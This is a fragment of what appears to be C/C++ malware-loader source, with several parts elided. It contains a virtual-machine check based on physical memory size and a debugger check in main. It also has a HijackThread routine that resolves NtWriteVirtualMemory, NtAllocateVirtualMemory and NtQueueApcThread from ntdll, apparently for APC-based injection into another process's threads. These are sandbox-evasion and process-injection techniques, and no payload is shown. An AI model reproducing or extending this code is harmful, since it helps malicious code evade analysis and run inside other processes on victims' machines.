...
BOOL VmCheck() {
    ...
    MEMORYSTATUSEX memory_stat;
    GlobalMemoryStatusEx(&memory_stat);
    if (memory_stat.ullTotalPhys <= (DWORD)(2*1073741824)) {
        return TRUE;
    }
    return FALSE;
}
...
int HijackThread(HANDLE process, vector<HANDLE> threads) {
    ...
    ntdll.NtWriteVirtualMemory = (ftNtWriteVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtWriteVirtualMemory");
    if (!ntdll.NtWriteVirtualMemory) {
        return 1;
    }

    ntdll.NtAllocateVirtualMemory = (ftNtAllocateVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtAllocateVirtualMemory");
    if (!ntdll.NtAllocateVirtualMemory) {
        return 1;
    }

    ntdll.NtQueueApcThread = (ftNtQueueApcThread)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueueApcThread");
...
int main() {
    ...
    if (IsDebuggerPresent2() || VmCheck() == TRUE) {
